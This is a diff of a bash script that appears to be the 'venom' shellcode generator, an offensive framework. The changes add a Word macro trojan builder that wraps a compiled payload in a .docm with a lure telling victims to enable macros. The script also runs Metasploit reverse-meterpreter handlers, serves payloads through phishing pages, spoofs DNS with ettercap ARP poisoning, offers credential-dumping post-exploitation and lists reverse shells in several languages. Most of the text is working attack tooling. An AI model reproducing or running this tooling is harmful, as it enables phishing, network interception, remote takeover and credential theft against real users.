       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -4080,9 +4362,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -4090,9 +4372,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
 
         fi
@@ -4102,7 +4384,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 sleep 2
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $D3F/index.html > /dev/null 2>&1
@@ -4123,7 +4405,7 @@ cd $IPATH/
 # build shellcode in EXE format (windows-platforms)
 # to deploy againts windows service (exe-service)
 # ------------------------------------------------------
-sh_shellcode21 () {
+sh_shellcode22 () {
 # module description
 cat << !
 ---
@@ -4134,7 +4416,7 @@ cat << !
 !
 sleep 2
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 
@@ -4144,9 +4426,9 @@ N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> exe-service format ..."
+echo "[☠] Building shellcode -> exe-service format ..."
 sleep 2
-echo "[☠ ] obfuscating -> msf encoders!"
+echo "[☠] obfuscating -> msf encoders!"
 sleep 2
 # display final settings to user
 cat << !
@@ -4171,9 +4453,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -4181,7 +4463,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" --width 350 --height 290) > /dev/null 2>&1
 
 
     # Build listenner resource file
@@ -4201,7 +4483,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -4213,9 +4495,9 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -4224,9 +4506,9 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -4240,12 +4522,171 @@ fi
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.exe > /dev/null 2>&1
 rm $D3F/index.html > /dev/null 2>&1
 rm $D3F/$N4m.exe > /dev/null 2>&1
+sleep 2
+clear
+cd $IPATH/
+}
+
+
+
+
+
+
+
+# -----------------------------------------------------
+# astrobaby word macro trojan payload
+# ------------------------------------------------------
+sh_shellcode23 () {
+# get user input to build shellcode
+echo "[☠] Enter shellcode settings!"
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
+N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
+
+
+# display final settings to user
+cat << !
+
+ shellcode settings
++------------------
+| LPORT   : $lport
+| LHOST   : $lhost
+| FORMAT  : C -> WINDOWS
+| PAYLOAD : windows/meterpreter/reverse_tcp
+|_AGENT   : $IPATH/output/$N4m.docm
+
+!
+
+   # check if all dependencies needed are installed
+   # check if template exists
+   if [ -e $IPATH/templates/astrobaby.c ]; then
+      echo "[☠] astrobaby.c -> found!"
+      sleep 2
+   else
+      echo "[☠] astrobaby.c -> not found!"
+      exit
+   fi
+
+
+   # check if mingw32 exists
+   c0m=`which i686-w64-mingw32-gcc`> /dev/null 2>&1
+   if [ "$?" -eq "0" ]; then
+      echo "[☠] mingw32 compiler -> found!"
+      sleep 2
+ 
+   else
+
+      echo "[☠] mingw32 compiler -> not found!"
+      echo "[☠] Download compiler -> apt-get install mingw32"
+      echo ""
+      sudo apt-get install mingw32
+      echo ""
+      fi
+
+
+# building template
+echo "[☠] editing/backup files .."
+cp $IPATH/templates/astrobaby.c $IPATH/templates/astrobaby[bk].c > /dev/nul 2>&1
+cd $IPATH/templates
+sed -i "s|LhOsT|$lhost|g" astrobaby.c
+sed -i "s|lPoRt|$lport|g" astrobaby.c
+sleep 2
+
+# compiling template
+echo "[☠] Compiling using mingw32 .."
+sleep 2
+# i586-mingw32msvc-gcc -mwindows suid.c -o payload.exe
+i686-w64-mingw32-gcc astrobaby.c -o payload.exe -lws2_32 -mwindows
+strip payload.exe > /dev/null 2>&1
+mv payload.exe $IPATH/output/$N4m.exe > /dev/null 2>&1
+echo "[☠] Binary: $IPATH/output/$N4m.exe .."
+cd $IPATH
+sleep 2
+
+
+
+# use metasploit to build shellcode
+echo "[☠] Generating the MS_word document .."
+sleep 2
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/windows/fileformat/office_word_macro; set EXE::Custom $IPATH/output/$N4m.exe; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; run; exit -y'" > /dev/null 2>&1
+mv $H0m3/.msf4/local/msf.docm $IPATH/output/$N4m.docm > /dev/null 2>&1
+echo "[☠] MS_word: $IPATH/output/$N4m.docm .."
+sleep 2
+
+
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.docm\n\nchose how to deliver: $N4m.docm" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+      sleep 2
+
+
+   else
+
+
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
+
+
+      # edit files nedded
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m.docm|g" mega.html > copy.html
+      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
+      cd $IPATH/output
+      cp $N4m.docm $ApAcHe/$N4m.docm > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+
+        if [ "$D0M4IN" = "yes" ]; then
+        # copy files nedded by mitm+dns_spoof module
+        sed "s|NaM3|$N4m.docm|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        cp $IPATH/output/$N4m.docm $D3F/$N4m.docm
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+
+        else
+
+        echo "- ATTACK VECTOR: http://$lhost"
+        echo "- POST EXPLOIT : $P0"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+
+        fi
+   fi
+
+sleep 2
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files..."
+mv $IPATH/templates/astrobaby[bk].c $IPATH/templates/astrobaby.c > /dev/nul 2>&1
+mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
+rm $IPATH/output/$N4m.exe > /dev/null 2>&1
+rm $ApAcHe/$N4m.docm > /dev/null 2>&1
+rm $D3F/index.html > /dev/null 2>&1
+rm $D3F/$N4m.docm > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -4260,10 +4701,12 @@ cd $IPATH/
 sh_buildin () {
 # module description
 cat << !
----
--- This module uses system built-in tools sutch as bash, netcat, ssh,
--- etc, and use them to spaw a tcp connection (reverse or bind shell).
----
+
+    ╔──────────────────────────────────────────────────────────────╗
+    | This module uses system built-in tools sutch as bash, netcat |
+    | ssh, python, etc, and use them to spaw a tcp connection      |
+    ╚──────────────────────────────────────────────────────────────╝
+
 !
 sleep 2
 QuE=$(zenity --question --title "☠ BUILT-IN SHELL GENERATOR ☠" --text "RUN BUILT-IN SHELL GENERATOR?" --width 350) > /dev/null 2>&1
@@ -4282,7 +4725,7 @@ QuE=$(zenity --question --title "☠ BUILT-IN SHELL GENERATOR ☠" --text "RUN B
 
 sh_stage2 () {
 # get user input to build the payload
-echo "[☆ ] Enter shell settings!"
+echo "[☆] Enter shell settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
 
@@ -4293,7 +4736,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
 
    # built-in systems shells
    if [ "$InSh3ll" = "simple bash shell" ]; then
-     echo "[✔ ] Building -> simple bash shell..."
+     echo "[✔] Building -> simple bash shell..."
      echo "---"
      echo "- simple bash shell that uses bash dev/tcp"
      echo "- socket programming to build a conection over tcp"
@@ -4304,12 +4747,12 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v -p $lport"
      sleep 2
 
 
    elif [ "$InSh3ll" = "simple reverse bash shell" ]; then
-     echo "[✔ ] Building -> simple reverse bash shell..."
+     echo "[✔] Building -> simple reverse bash shell..."
      echo "---"
      echo "- simple reverse bash shell uses bash dev/tcp"
      echo "- socket programming to build a reverse shell over tcp"
@@ -4320,13 +4763,13 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
  
 
 
    elif [ "$InSh3ll" = "simple reverse netcat shell" ]; then
-     echo "[✔ ] Building -> simple reverse netcat shell..."
+     echo "[✔] Building -> simple reverse netcat shell..."
      echo "---"
      echo "- simple Netcat reverse shell using bash"
      echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
@@ -4336,12 +4779,12 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
    elif [ "$InSh3ll" = "simple ssh shell" ]; then
-     echo "[✔ ] Building -> simple ssh shell..."
+     echo "[✔] Building -> simple ssh shell..."
      echo "---"
      echo "- Reverse connect using an SSH tunnel"
      echo "- Use The ssh client to forward a local port"
@@ -4352,7 +4795,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v 127.0.0.1 -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v 127.0.0.1 -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v 127.0.0.1 -p $lport"
      sleep 2
 
 
@@ -4365,7 +4808,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      mv final.raw $IPATH/output/$N4m > /dev/null 2>&1
      chmod +x $IPATH/output/$N4m > /dev/null 2>&1
 
-     echo "[✔ ] Building -> simple reverse python shell..."
+     echo "[✔] Building -> simple reverse python shell..."
      echo "---"
      echo "- Reverse connect using one-liner python shell"
      echo "- that uses bash and socket to forward a tcp connection"
@@ -4379,7 +4822,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "---"
      sleep 3
      zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
@@ -4393,7 +4836,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      chmod +x $IPATH/output/$N4m > /dev/null 2>&1
      chown $user $IPATH/output/$N4m > /dev/null 2>&1
 
-     echo "[✔ ] Building -> simple reverse python shell..."
+     echo "[✔] Building -> simple reverse python shell..."
      echo "---"
      echo "- Reverse connect using one-liner python shell"
      echo "- that uses bash and socket to forward a tcp connection"
@@ -4408,7 +4851,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "---"
      sleep 3
      zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
@@ -4421,7 +4864,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      mv final.raw $IPATH/output/$N4m > /dev/null 2>&1
      chmod +x $IPATH/output/$N4m > /dev/null 2>&1
 
-     echo "[✔ ] Building -> simple powershell shell..."
+     echo "[✔] Building -> simple powershell shell..."
      echo "---"
      echo "- Reverse connection using one-liner powershell (ancii enc)"
      echo "- that uses powershell socket to forward a tcp connection"
@@ -4436,12 +4879,12 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "---"
      sleep 3
      zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m" --info > /dev/null 2>&1
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
    elif [ "$InSh3ll" = "ruby Reverse_bash_shell" ]; then
-     echo "[✔ ] Building -> reverse bin/sh shell..."
+     echo "[✔] Building -> reverse bin/sh shell..."
      echo "---"
      echo "- simple ruby bash shell that uses rsocket"
      echo "- socket programming to build a conection over tcp"
@@ -4451,12 +4894,12 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
    elif [ "$InSh3ll" = "ruby Reverse_bash_shell2" ]; then
-     echo "[✔ ] Building -> reverse bin/sh shell..."
+     echo "[✔] Building -> reverse bin/sh shell..."
      echo "---"
      echo "- simple ruby bash shell that uses rsocket"
      echo "- socket programming to build a conection over tcp"
@@ -4466,12 +4909,12 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
    elif [ "$InSh3ll" = "simple php reverse shell" ]; then
-     echo "[✔ ] Building -> simple php reverse shell..."
+     echo "[✔] Building -> simple php reverse shell..."
      echo "---"
      echo "- simple php reverse shell that uses socket programming"
      echo "- and bash (to execute) to forward a tcp connection"
@@ -4481,7 +4924,7 @@ InSh3ll=$(zenity --list --title "☆ SYSTEM built-in SHELLS ☆" --text "\nThis 
      echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
      echo "---"
      sleep 3
-     xterm -T "☆ NETCAT LISTENER ☆" -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
+     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
      sleep 2
 
 
@@ -4516,7 +4959,7 @@ sleep 1
 # exit venom framework
 # ------------------------------------
 sh_exit () {
-echo "[☠ ] Exit Console -> Stoping Services..."
+echo "[☠] Exit Console -> Stoping Services..."
 sleep 1
 if [ "$DiStR0" = "Kali" ]; then
 service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
@@ -4550,41 +4993,43 @@ cat << !
          \  \  //|   ___||    \ | |/     \|    \  /  |
           \  \// |   ___||     \| ||     ||     \/   |
            \__/  |______||__/\____|\_____/|__/\__/|__|$ver
-    +-----------------+-----------+------------+------------------+
+    ╔─────────────────╦───────────╦────────────╦──────────────────╗
     |  OPTIONS BUILD  | TARGET OS |   FORMAT   |      OUTPUT      |
-    +-----------------+-----------+------------+------------------+
-    |  1 - shellcode     unix         C             C             |
-    |  2 - shellcode     windows      C             DLL           |
-    |  3 - shellcode     windows      DLL           DLL           |
-    |  4 - shellcode     windows      C             PYTHON/EXE    |
-    |  5 - shellcode     windows      C             EXE           |
-    |  6   shellcode     windows      PSH-CMD       EXE           |
-    |  7 - shellcode     windows      C             RUBY          |
-    |  8 - shellcode     windows      MSI-NOUAC     MSI           |
-    |  9 - shellcode     windows      POWERSHELL    BAT           |
-    | 10 - shellcode     windows      HTA-PSH       HTA           |
-    | 11 - shellcode     windows      PSH-CMD       PS1           |
-    | 12 - shellcode     windows      PSH-CMD       BAT           |
-    | 13 - shellcode     windows      VBS           VBS           |
-    | 14 - shellcode     windows      PSH-CMD       VBS           |
-    | 15 - shellcode     windows      PSH-CMD/C     PDF           |
-    | 16 - shellcode     webserver    PHP           PHP/PHP       |
-    | 17 - shellcode     multi OS     PYTHON        PYTHON        |
-    | 18 - shellcode     multi OS     JAVA/PSH      JAR(RCE)      |
-    | 19 - web_delivery  multi OS     PYTHON/PSH    PYTHON/BAT    |
-    | 20 - shellcode     android      DALVIK        APK           |
-    | 21 - shellcode     windows      EXE-SERVICE   EXE           |
+    ╠─────────────────╩───────────╩────────────╩──────────────────╣
+    |  1 - shellcode     unix(s)      C              C            |
+    |  2 - shellcode     windows      C              DLL          |
+    |  3 - shellcode     windows      DLL            DLL          |
+    |  4 - shellcode     windows      C              PYTHON,EXE   |
+    |  5 - shellcode     windows      C              EXE          |
+    |  6   shellcode     windows      PSH-CMD        EXE          |
+    |  7 - shellcode     windows      C              RUBY         |
+    |  8 - shellcode     windows      MSI-NOUAC      MSI          |
+    |  9 - shellcode     windows      POWERSHELL     BAT          |
+    | 10 - shellcode     windows      HTA-PSH        HTA          |
+    | 11 - shellcode     windows      PSH-CMD        PS1          |
+    | 12 - shellcode     windows      PSH-CMD        BAT          |
+    | 13 - shellcode     windows      VBS            VBS          |
+    | 14 - shellcode     windows      PSH-CMD        VBS          |
+    | 15 - shellcode     windows      PSH-CMD,C      PDF          |
+    | 16 - shellcode     webserver    PHP            PHP,PHP      |
+    | 17 - shellcode     multi OS     PYTHON         PYTHON       |
+    | 18 - shellcode     multi OS     JAVA,PSH       JAR(RCE)     |
+    | 19 - web_delivery  multi OS     PYTHON,PSH     PYTHON,BAT   |
+    | 20 - web_delivery  unix(s)      SH,PYTHON      DEB          |
+    | 21 - shellcode     android      DALVIK         APK          |
+    | 22 - shellcode     windows      EXE-SERVICE    EXE          |
+    | 23 - shellcode     windows      C              DOCM(word)   |
     |                                                             |
     |  S - system built-in shells                                 |
     |  F - FAQ (frequent ask questions)                           |
     |  E - exit Shellcode Generator                               |
-    +-------------------------------------------------------------+
-                                                 SSA-RedTeam@2016_|
+    ╚─────────────────────────────────────────────────────────────╣
+                                                 SSA-RedTeam@2017_|
 
 !
-echo "[☠ ] Shellcode Generator"
+echo "[☠] Shellcode Generator"
 sleep 1
-echo -n "[➽ ] Chose Your Venom:"
+echo -n "[➽] Chose Your Venom:"
 read choice
 case $choice in
 1) sh_shellcode1 ;;
@@ -4605,9 +5050,11 @@ case $choice in
 16) sh_shellcode16 ;;
 17) sh_shellcode17 ;;
 18) sh_shellcode18 ;;
-19) sh_web_delivery ;;
-20) sh_dalvik ;;
+19) sh_shellcode19 ;;
+20) sh_shellcode20 ;;
 21) sh_shellcode21 ;;
+22) sh_shellcode22 ;;
+23) sh_shellcode23 ;;
 S) sh_buildin ;;
 s) sh_buildin ;;
 f) sh_FAQ ;;
